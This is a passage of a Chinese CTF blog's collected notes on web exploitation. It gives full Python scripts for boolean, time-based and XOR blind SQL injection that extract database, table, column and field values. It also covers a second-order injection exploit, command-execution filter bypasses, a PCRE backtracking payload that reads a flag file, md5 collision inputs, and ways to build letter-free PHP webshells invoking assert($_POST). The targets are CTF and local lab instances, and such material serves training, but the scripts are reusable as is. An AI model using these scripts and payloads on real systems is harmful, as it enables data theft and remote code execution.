1,md5(123)#&amp;password=123\n\n二次注入的payload[网鼎杯2018]Unfinish\n0&apos;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&apos;0\n\n脚本异或盲注脚本import requestsurl='http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'flag=''for i in range(50):    a = 32    b = 128    mid = (a+b)//2    while(a&lt;b):                 #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)   爆表名                  #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))&gt;0)  爆列名        print(mid)        payload = url+\"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)\"%(i,mid)        import time        time.sleep(1)        re = requests.get(url=payload)        # 首先判断目标值 是否小于         if 'admin' in re.text:            a = mid + 1        else:            # 目标值 大于 则直接 将 mid 赋值给 b            b = mid        mid = (a+b)//2    # 这个二分查找的方式是 完整的走完一遍，也就是跑7次     if (mid==32|mid==128):        break    flag +=chr(mid)    print(flag)\n\n[网鼎杯2018]Unfinish 拿flag脚本import requestslogin_url='http://bd22f3b3-0647-4006-bfca-e63aaad5a97d.node4.buuoj.cn:81/login.php'register_url='http://bd22f3b3-0647-4006-bfca-e63aaad5a97d.node4.buuoj.cn:81/register.php'content=''for i in range(1,20):    data_register=&#123;'email':'15@%d'%i,'username':\"0'+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+'0\"%i,'password':'1'&#125;    #print(data)    data_login=&#123;'email':'15@%d'%i,'password':'1'&#125;    res = requests.post(register_url,data=data_register)    print(res)    rr=requests.post(login_url,data=data_login)    rr.encoding='utf-8'    r=rr.text    location=r.find('user-name')    cont=r[location+17:location+42].strip()    content+=cont    print(cont)#content=content.decode('hex').decode('hex')print(content)\n\n自己写的脚本（用于dvwa和sqllib靶场）布尔盲注import requests# 功能：基于回显的布尔盲注脚本# 适用于sqlilabs DVWA # 根据 key 的内容判断class exp_sql(object):    def __init__(self, key, params=None,headers=None):        # 判断回显的关键字        self.str_key = key        # 头部        self.headers = headers        # 参数        self.params = params    def get_dbname(self, url): # 拿到当前数据库名        # payload = \"' and (length(database())=8) --+\"        length = 1        while True:            payload = \"' and (length(database())=%d) --+\"%(length)            payload_url = url+payload            # print(\"[*] \"+payload)            resp = requests.get(payload_url, headers=self.headers, params=self.params)            # print(resp.text)            if self.str_key in resp.text:                print(\"[+] length: \" + str(length))                db_name = self.exp_dbname(url, length)                break            length+=1        print(\"[+] 当前数据库名: \" + db_name)        def exp_dbname(self, url, length): # 爆破数据库名        arr_str = self.ascii_str()        db_name = \"\"        # ord 返回字符串第一个字符的 ASCII 值。        # mid 得到一个字符串的一部分        for i in range(1, length+1):            for j in arr_str:                payload = \"' and (ord(mid(database(),%d,1))='%s')--+\"%(i,ord(j))                payload_url = url + payload                # print(\"[*]  \" + payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    # print(\"[+]  \" + j)                    break            db_name += j             print(\"[*]\" + db_name)                return db_name    def get_tables(self, url): # 拿到当前数据库所有表名数量        # ' and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+        num = 0        while True:            payload = \"' and %d=(select count(table_name) from information_schema.tables where table_schema=database())--+\"%(num)            payload_url = url + payload            # print(\"[*]  \" + payload_url)            # print(payload)            resp = requests.get(payload_url, headers=self.headers, params=self.params)            # print(resp.text)            if self.str_key in resp.text:                print(\"当前数据库表总数量：\"+str(num))                tables = self.get_table_length(url, num)                break            num += 1        print(\"[+] 当前数据库所有表: \" + str(tables))    def get_table_length(self, url, num): # 判断单个表名长度        tables = []        # ' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+\"%(i,j)        for i in range(0, num):            length = 1            while True:                # 判断表长度                payload = \"' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+\"%(i, length)                payload_url = url+ payload                # print(\"[*]  \" + payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    print(\"[+] 表名长度 \" + str(length))                    # 由长度 猜解表名                    table_name = self.get_table_name(url, i, length)                    print(\"[+] 第\"+str(i+1)+ \"张表名：\" + table_name)                    tables.append(table_name)                    break                length += 1                    return tables    def get_table_name(self, url, count,length): # 猜解表名        arr_str = self.ascii_str()        table_name = \"\"        # ' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+        for i in range(1, length+1):            for s in arr_str:                payload = \"' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+\"%(count, i, ord(s))                payload_url = url+ payload                # print(payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    # print(\"[*]  \" + s)                    break                        table_name += s            print(\"[*] \" + table_name)        return table_name    def get_columns(self, url, tables): # 拿到传入的表中所有字段名        table_dict = &#123;&#125;        for table in tables:            num = 0            while True:                payload = \"'and %d=(select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())--+\"%(num, table)                payload_url = url + payload                # print(payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    print('[+] 总字段数 num: ' + str(num))                    columns = self.get_column_length(url, num, table)                    break                num += 1            table_dict[table] = columns                print(\"[+] &#123;表名: [字段名..]&#125; \" + str(table_dict))            def get_column_length(self, url, num, table): # 判断单个字段长度        columns = []        # 'and (select length(column_name) from information_schema.columns where table_name='%s' limit %d ,1)=%d --+        for i in range(0, num):            length = 1            while True:                payload = \"'and (select length(column_name) from information_schema.columns where table_name='%s' and table_schema=database()  limit %d ,1)=%d --+\"%(table, i, length)                payload_url = url + payload                       resp = requests.get(payload_url, headers=self.headers, params=self.params)                # print(payload)                if self.str_key in resp.text:                    print(\"[+] length: \" + str(length))                    column_name = self.get_column_name(url, i, table, length)                    print(\"[+] \" + column_name)                    columns.append(column_name)                    break                length += 1        return columns    def get_column_name(self, url, num, table, length): # 拿到单个字段名        str_arr = self.ascii_str()        column_name = \"\"        # 'and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+        for i in range(1, length+1):            for s in str_arr:                payload = \"'and ord(mid((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1),%d,1))=%d --+\"%(table, num, i, ord(s))                payload_url = url + payload                # print(payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    # print(\"[+] \" + s)                    column_name += s                    break            print(\"[*] \" + column_name)                return column_name        def get_columns_value(self, url, table, columns):  # 拿到传入字段的所有字段值        column_dict = &#123;&#125;        # 'and (select count('username') from users )=13 --+        for column in columns:            num = 0            while True:                payload = \"'and (select count(%s) from %s )=%d --+\"%(column, table, num)                payload_url = url + payload                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    print(\"[+] num \" + str(num))                    columns_value = self.get_column_value_length(url, table, column, num)                    column_dict[column] = columns_value                    break                num += 1                    print(\"[+] &#123;字段名1: &#123;字段值1..&#125;, 字段名2: &#123;字段值1..&#125;&#125; \\n\" + str(column_dict))    def get_column_value_length(self, url, table, column, num):  # 拿到当前传入字段值长度        columns_value = []        #  'and (select length(%s) from %s limit %d,1)=%d --+        for i in range(0, num):            length = 1            while True:                payload = \"'and (select length(%s) from %s limit %d,1)=%d --+\"%(column, table, i, length)                payload_url = url + payload                # print(payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                            # print(\"[+] num \" + str(i) + \"   length \" + str(length))                            column_value = self.exp_column_value(url, table, column, i, length)                            print(\"[+] \" + column_value)                            columns_value.append(column_value)                            break                length += 1         return columns_value    def exp_column_value(self, url, table, column, num, length): # 拿到单个字段值        arr_str = self.ascii_str()        column_value = \"\"        # 'and ord(mid((select count(username) from users limit 0,1) 0,1))=%s        for i in range(1, length+1):            for s in arr_str:                payload = \"'and ord(mid((select %s from %s limit %d,1),%d,1))=%d --+\"%(column, table, num, i, ord(s))                payload_url = url + payload                # print(payload)                resp = requests.get(payload_url, headers=self.headers, params=self.params)                if self.str_key in resp.text:                    # print(\"[+] \" + s)                    column_value += s                    break            print(\"[*] \" + column_value)        return column_value    def ascii_str(self): #生成库名表名字符所在的字符列表字典        str_list=[]        for i in range(33,127):#所有可显示字符            str_list.append(chr(i))        #print('可显示字符：%s'%str_list)        return str_list #返回字符列表if __name__ == \"__main__\":    # sqli less-5    s1 = exp_sql(key=\"You are in\")    # s1.get_dbname(url=\"http://127.0.0.1:9002/Less-5/?id=1\")    # s1.get_tables(url=\"http://127.0.0.1:9002/Less-5/?id=1\")    # s1.get_columns(url=\"http://127.0.0.1:9002/Less-5/?id=1\", tables=['users'])    s1.get_columns_value(url=\"http://127.0.0.1:9002/Less-8/?id=1\", table='users', columns=['username', 'password'])     # DVWA 盲注    # key = \"exists\"    # headers = &#123;\"Cookie\": \"sitekeyword=%26nbsp%3B; PHPSESSID=405e9e837c04dfda1cae39e51c85e316; security=low\",    #            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\"&#125;    # params = &#123;\"Submit\": \"Submit\"&#125;       # s2 = exp_sql(key=key, headers=headers, params=params)    # # # s2.get_dbname(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\")    # # # s2.get_tables(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\")    # # s2.get_columns(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\", tables=['guestbook'])    # s2.get_columns_value(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\", table='users', columns=['user', 'password'])\n\n时间盲注import requestsimport datetime# 功能：基于回显的布尔盲注脚本# 适用于sqlilabs DVWA class exp_sql(object):    def __init__(self, sec=3, params=None,headers=None):        # 暂停秒数 低于3秒 返回结果可能不准确         self.sec = sec        # 头部        self.headers = headers        # 参数        self.params = params    def get_dbname(self, url): # 拿到当前数据库名        # 'and if(left(database(),1)='%s' , sleep(3), 1) --+        length = 1        while True:            payload = \"'and if(length(database())=%d, sleep(%d), 1) --+\"%(length, self.sec)            payload_url = url+payload            # print(payload)            startTime = datetime.datetime.now()            resp = requests.get(payload_url, headers=self.headers, params=self.params)            endTime = datetime.datetime.now()            if (endTime - startTime).seconds &gt;=self.sec:                print(\"[+] length: \" + str(length))                db_name = self.exp_dbname(url, length)                break            length+=1        print(\"[+] 当前数据库名: \" + db_name)        def exp_dbname(self, url, length): # 爆破数据库名        # ' and if(substr(database(), %d, 1)='%s' , sleep(3), 1) --+        arr_str = self.ascii_str()        db_name = \"\"        # ord 返回字符串第一个字符的 ASCII 值。        # mid 得到一个字符串的一部分        for i in range(1, length+1):            for j in arr_str:                payload = \"' and if(substr(database(), %d, 1)='%s' , sleep(%d), 1) --+\"%(i, j, self.sec)                payload_url = url + payload                # print(\"[*]  \" + payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    # print(\"[+]  \" + j)                    break            db_name += j             print(\"[*]\" + db_name)                return db_name    def get_tables(self, url): # 拿到当前数据库所有表名        # 'and if( (select count(table_name) from information_schema.tables where table_schema=database())=%d, sleep(3), 1) --+\"%(num)        num = 0        while True:            payload = \"'and if((select count(table_name) from information_schema.tables where table_schema=database())=%d, sleep(%d), 1) --+\"%(num, self.sec)            payload_url = url + payload            # print(\"[*]  \" + payload_url)            # print(payload)            startTime = datetime.datetime.now()            resp = requests.get(payload_url, headers=self.headers, params=self.params)            endTime = datetime.datetime.now()            if (endTime - startTime).seconds &gt;=self.sec:                print(\"当前数据库表总数量：\"+str(num))                tables = self.get_table_length(url, num)                break            num += 1        print(\"[+] 当前数据库所有表: \" + str(tables))    def get_table_length(self, url, num): # 判断单个表名长度        tables = []        # 'and if( (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d, sleep(%d), 1) --+        for i in range(0, num):            length = 1            while True:                # 判断表长度                payload = \"'and if( (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d, sleep(%d), 1) --+\"%(i, length, self.sec)                payload_url = url+ payload                # print(\"[*]  \" + payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    print(\"[+] 表名长度 \" + str(length))                    # 由长度 猜解表名                    table_name = self.get_table_name(url, i, length)                    print(\"[+] 第\"+str(i+1)+ \"张表名：\" + table_name)                    tables.append(table_name)                    break                length += 1                    return tables    def get_table_name(self, url, count,length): # 猜解表名        arr_str = self.ascii_str()        table_name = \"\"        # 'and if(ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d,1))=%s, sleep(3), 1) --+\"%(count, i, ord(s))        for i in range(1, length+1):            for s in arr_str:                payload = \"'and if(ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d,1))=%s, sleep(%d), 1) --+\"%(count, i, ord(s), self.sec)                payload_url = url+ payload                # print(payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    # print(\"[*]  \" + s)                    table_name += s                    break                print(\"[*] \" + table_name)        return table_name    def get_columns(self, url, tables): # 拿到传入的表中所有字段名        # 'and if((select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())=%d, sleep(3), 1)--+\"%(table, num)        table_dict = &#123;&#125;        for table in tables:            num = 0            while True:                payload = \"'and if((select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())=%d, sleep(%d), 1)--+\"%(table, num, self.sec)                payload_url = url + payload                # print(payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    print('[+] 总字段数 num: ' + str(num))                    columns = self.get_column_length(url, num, table)                    break                num += 1            table_dict[table] = columns                print(\"[+] &#123;表名: [字段名..]&#125; \" + str(table_dict))            def get_column_length(self, url, num, table): # 判断单个字段长度        columns = []        # 'and if((select length(column_name) from information_schema.columns where table_name='%s'  and table_schema=database() limit %d,1)=%d , sleep(3), 1) --+\"%(table, i, length)        for i in range(0, num):            length = 1            while True:                payload = \"'and if((select length(column_name) from information_schema.columns where table_name='%s'  and table_schema=database() limit %d,1)=%d , sleep(%d), 1) --+\"%(table, i, length, self.sec)                payload_url = url + payload                       startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    print(\"[+] length: \" + str(length))                    column_name = self.get_column_name(url, i, table, length)                    print(\"[+] \" + column_name)                    columns.append(column_name)                    break                length += 1        return columns    def get_column_name(self, url, num, table, length): # 拿到单个字段名        str_arr = self.ascii_str()        column_name = \"\"        # 'and if(ord(mid((select column_name from information_schema.columns where table_name='%s'  and table_schema=database() limit %d,1), %d,1))=%d , sleep(3), 1) --+\"%(table, num, i, ord(s))        for i in range(1, length+1):            for s in str_arr:                payload = \"'and if(ord(mid((select column_name from information_schema.columns where table_name='%s'  and table_schema=database() limit %d,1), %d,1))=%d , sleep(%d), 1) --+\"%(table, num, i, ord(s), self.sec)                payload_url = url + payload                # print(payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    # print(\"[+] \" + s)                    column_name += s                    break            print(\"[*] \" + column_name)                return column_name        def get_columns_value(self, url, table, columns):  # 拿到传入字段的所有字段值        column_dict = &#123;&#125;        # 'and if((select count(%s) from %s)=%d, sleep(3), 1) --+\"%(column, table, num)        for column in columns:            num = 0            while True:                payload = \"'and if((select count(%s) from %s)=%d, sleep(%d), 1) --+\"%(column, table, num, self.sec)                payload_url = url + payload                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    print(\"[+] num \" + str(num))                    columns_value = self.get_column_value_length(url, table, column, num)                    column_dict[column] = columns_value                    break                num += 1                    print(\"[+] &#123;字段名1: &#123;字段值1..&#125;, 字段名2: &#123;字段值1..&#125;&#125; \\n\" + str(column_dict))    def get_column_value_length(self, url, table, column, num):  # 拿到当前传入字段值长度        columns_value = []        #  'and (select length(%s) from %s limit %d,1)=%d --+        for i in range(0, num):            length = 1            while True:                payload = \"'and if((select length(%s) from %s limit %d,1)=%d, sleep(%d), 1) --+\"%(column, table, i, length, self.sec)                payload_url = url + payload                # print(payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                            # print(\"[+] num \" + str(i) + \"   length \" + str(length))                            column_value = self.exp_column_value(url, table, column, i, length)                            print(\"[+] \" + column_value)                            columns_value.append(column_value)                            break                length += 1         return columns_value    def exp_column_value(self, url, table, column, num, length): # 拿到单个字段值        arr_str = self.ascii_str()        column_value = \"\"        # 'and if(ord(mid((select %s from %s limit %d,1), %d,1))=%d, sleep(3), 1) --+\"%(column, table, num, i, ord(s))        for i in range(1, length+1):            for s in arr_str:                payload = \"'and if(ord(mid((select %s from %s limit %d,1), %d,1))=%d, sleep(%d), 1) --+\"%(column, table, num, i, ord(s), self.sec)                payload_url = url + payload                # print(payload)                startTime = datetime.datetime.now()                resp = requests.get(payload_url, headers=self.headers, params=self.params)                endTime = datetime.datetime.now()                if (endTime - startTime).seconds &gt;=self.sec:                    # print(\"[+] \" + s)                    column_value += s                    break            print(\"[*] \" + column_value)        return column_value    def ascii_str(self): #生成库名表名字符所在的字符列表字典        str_list=[]        for i in range(33,127):#所有可显示字符            str_list.append(chr(i))        #print('可显示字符：%s'%str_list)        return str_list #返回字符列表if __name__ == \"__main__\":    # sqli less-5    # s1 = exp_sql()    # s1.get_dbname(url=\"http://127.0.0.1:9002/Less-9/?id=1\")    # s1.get_tables(url=\"http://127.0.0.1:9002/Less-9/?id=1\")    # s1.get_columns(url=\"http://127.0.0.1:9002/Less-9/?id=1\", tables=['users'])    # s1.get_columns_value(url=\"http://127.0.0.1:9002/Less-9/?id=1\", table='users', columns=['username', 'password'])     # DVWA 盲注    headers = &#123;\"Cookie\": \"sitekeyword=%26nbsp%3B; PHPSESSID=dee9efccd127ae9b659726416910bbaf; security=low\",               \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\"&#125;    params = &#123;\"Submit\": \"Submit\"&#125;       # s2 = exp_sql(headers=headers, params=params)    # s2.get_dbname(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\")    # s2.get_tables(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\")    # # s2.get_columns(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\", tables=['guestbook'])    # s2.get_columns_value(url=\"http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1\", table='users', columns=['user', 'password'])\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【命令执行和代码执行】漏洞做题姿势积累","url":"/2021/10/22/CTF-Web%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做命令执行和代码执行类题目的做题姿势，会不断更新。\n\nphp中的会造成代码执行函数evalassert` (反引号)...\n\nphp中的会造成命令执行函数execshell_execsystempassthru...\n\n命令执行函数搜索flag文件命令\nfind / -name flag*\n\nphp搜索文件函数\nprint_r(glob(&quot;flag*&quot;))// 因为返回是一个数组 只能用print_r 或者 var_dump输出\n\n过滤命令执行 空格被过滤 $&#123;IFS&#125;$&#123;IFS&#125;$9$IFS$9重定向符&lt;&gt;&lt;&gt;&lt;编码%09\n\nctf中常用php函数get_defined_vars()     // 返回由所有已定义变量所组成的数组\n\nLinux查看文件内容的命令cattacmorelessheadtail\n\n绕过 preg_match的方式\n换行绕过\n\nPCRE回溯绕过\n\n数组绕过\n\n编码绕过（8进制、16进制）\n\n未过滤函数绕过\n\nPHP开启short_open_tag=on，即可使用短标签\n\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【代码审计】做题姿势积累","url":"/2021/10/22/CTF-Web%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做代码审计类题目的做题姿势，会不断更新。\n案例来源于各大师傅们的博客和平时做题遇到。\n\nphpinfo中的相关知识点disable_functions 禁用的系统函数\nPHP开启short_open_tag=on，即可使用短标签\npreg_match绕过if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))// 绕过方式：换行绕过// ?b_u_p_t=23333%0a\n\nif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) &#123;    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';  &#125;// PCRE回溯绕过\n\n# PCRE回溯绕过利用脚本import requestsurl  = \"http://3f0c0ea0-47c8-4ae8-8f1c-dcd5c21ec12d.node3.buuoj.cn\"payload = '&#123;\"cmd\": \"/bin/cat /home/rceservice/flag\", \"zz\": \"'+\"a\"*(1000000)+'\"&#125;'res = requests.post(url, data=&#123;\"cmd\": payload&#125;, timeout=10)print(res.text)\n\nmd5、sha1绕过if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52'])// 绕过方式：数组绕过// md51[]=1&amp;md52[]=2\n\nif((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123;    die(\"success!\");&#125;// 绕过payload// param1=1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2=1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED\n\n$flag = \"flag\";if (isset($_GET['name']) and isset($_GET['password'])) &#123;    if ($_GET['name'] == $_GET['password'])        echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;';    else if (sha1($_GET['name']) === sha1($_GET['password']))      die('Flag: '.$flag);    else        echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else    echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt;# 绕过方式：数组绕过# ?name[]=1&amp;password[]=2\n\n关键字过滤后绕过_ 的代替字符 \n[\n空格 的代替字符\n${IFS}     ${IFS}$9     &lt;     %09\n混淆绕过\n比如 cat 可以这样 c&quot;&quot;at\njson_decode特性\n可以接收Unicode编码后的字符\n\n$js = json_decode('&#123;\"name\": \"\\u0068\\u0065\\u006c\\u006c\\u006f\"&#125;');print_r($js);//stdClass Object//(//    [name] =&gt; hello//)// 有时候可以用来绕过正则匹配\n\nbasename缺陷\n文件名首尾任何非ASCII码的字符都会被rename函数删除掉\n\n构造无字母webshell的三种方式&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123;  eval($_GET['shell']);&#125;\n\n在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。\n异或如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。\n演示\n构造 phpinfo p:%FF^%8Fo:%FF^%90n:%FF^%91i:%FF^%96h:%FF^%97f:%FF^%99$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();在php5 可以用assert 函数 php7 不能php5 下$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);// assert$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;);\t//_POST$___=$$__; \t\t//$_POST$_($___[_]);\t//assert($_POST[_])POST _=phpinfo();\n\n![image-20210823153951769](F:\\D-学习笔记\\BUUCTF WP\\image-20210823153951769.png)\n生成脚本\npython\nimport urllib.parsefind = ['p','h','i','n','f','o']for i in range(1,256):    for j in range(1,256):        result = chr(i^j)        if(result in find):            a = i.to_bytes(1,byteorder='big')            b = j.to_bytes(1,byteorder='big')            a = urllib.parse.quote(a)            b = urllib.parse.quote(b)            print(\"%s:%s^%s\"%(result,a,b))\n\nphp\n$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255); // dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= \"%ff\";                $r .= \"%0\" . dechex($j);                continue;            &#125;            $l .= \"%ff\";            $r .= \"%\" . dechex($j);            continue;        &#125;    &#125;&#125;echo \"\\&#123;$l`$r\\&#125;\";\n\n取反参考\n与异或类似，不过它利用的是 UTF-8 编码中的某个汉子 , 将其中的某个字符提取出来 , 进行取反后得到对应字符\n生成步骤 \n\n找到 “p“ 对应的 ASCII码，拿到对应的十六进制编码 70\n\n在前面添加两个十六进制数 . 这个数是任意的 . 然后将它取反 . 在线\n比如这里用 7B，然后就行取反。\n![image-20210823160420273](F:\\D-学习笔记\\BUUCTF WP\\image-20210823160420273.png)\n\n将取反后的数字写成 NCR 格式( &amp;#x … ) , 并且将它转换为中文字符 在线\n&amp;#x848f\n\n\n![image-20210823160541639](F:\\D-学习笔记\\BUUCTF WP\\image-20210823160541639.png)\n\n带入代码测试 , 取第二个字符( 第一个字符是你任意添加的 ) , 即可得到需要的字符\n\n\n\n\n\n示范\n构建 phpinfo 进行测试\np h i n f o  对应的 十六进制编码 70 68 69 6e 66 6f\n加入 7b 取反\n原字符      十六进制         取反            转为字符 \n p             7b70                 848F            蒏\n h             7b68                  8497            蒗\ni               7b69                  8496            蒖\nn             7b6e                  8491            蒑\nf             7b66                  8499            蒙\no            7b6f                   8490            蒐\n&lt;?php$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //2$__='';$___=\"蒏\";$__.=~($___&#123;$_&#125;);$___=\"蒗\";$__.=~($___&#123;$_&#125;);$___=\"蒏\";$__.=~($___&#123;$_&#125;);$___=\"蒖\";$__.=~($___&#123;$_&#125;);$___=\"蒑\";$__.=~($___&#123;$_&#125;);$___=\"蒙\";$__.=~($___&#123;$_&#125;);$___=\"蒐\";$__.=~($___&#123;$_&#125;);// phpinfo();$__();p神的例子    